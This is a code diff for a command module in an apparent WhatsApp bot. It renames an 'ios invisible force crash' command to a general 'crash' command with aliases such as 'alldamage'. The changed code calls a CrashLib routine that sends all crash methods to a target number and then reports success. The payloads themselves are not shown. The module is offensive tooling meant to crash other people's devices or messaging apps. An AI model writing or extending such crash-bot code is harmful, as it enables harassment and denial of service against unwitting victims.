@@ -2,11 +2,11 @@
 const { CrashLib } = require('../../lib/crashlib');
 
 module.exports = {
-    name: 'ios',
-    aliases: ['ioscrash', 'iosforce'],
+    name: 'crash',
+    aliases: ['crashall', 'executeall', 'alldamage'],
     category: 'crash',
-    desc: 'ɪᴏs ɪɴᴠɪsɪʙʟᴇ ғᴏʀᴄᴇ ᴄʀᴀsʜ',
-    usage: '.ios <number>',
+    desc: 'ᴇxᴇᴄᴜᴛᴇ ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs',
+    usage: '.crash <number>',
     waitReact: true,
 
     async execute(sock, msg, args, ctx) {
@@ -17,11 +17,11 @@ module.exports = {
             crashLib = new CrashLib(sock);
         }
         
-        await sock.sendMessage(ctx.from, { text: '💥 sᴇɴᴅɪɴɢ ɪᴏs ᴄʀᴀsʜ...' }, { quoted: msg });
+        await sock.sendMessage(ctx.from, { text: '💣 ᴇxᴇᴄᴜᴛɪɴɢ ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs...' }, { quoted: msg });
         
         try {
-            await crashLib.iosInvisibleForce(target);
-            return sock.sendMessage(ctx.from, { text: '✅ ɪᴏs ᴄʀᴀsʜ sᴇɴᴛ ᴛᴏ ' + target }, { quoted: msg });
+            await crashLib.executeAll(target, msg);
+            return sock.sendMessage(ctx.from, { text: '✅ ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs sᴇɴᴛ ᴛᴏ ' + target }, { quoted: msg });
         } catch (e) {
             return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg });
         }
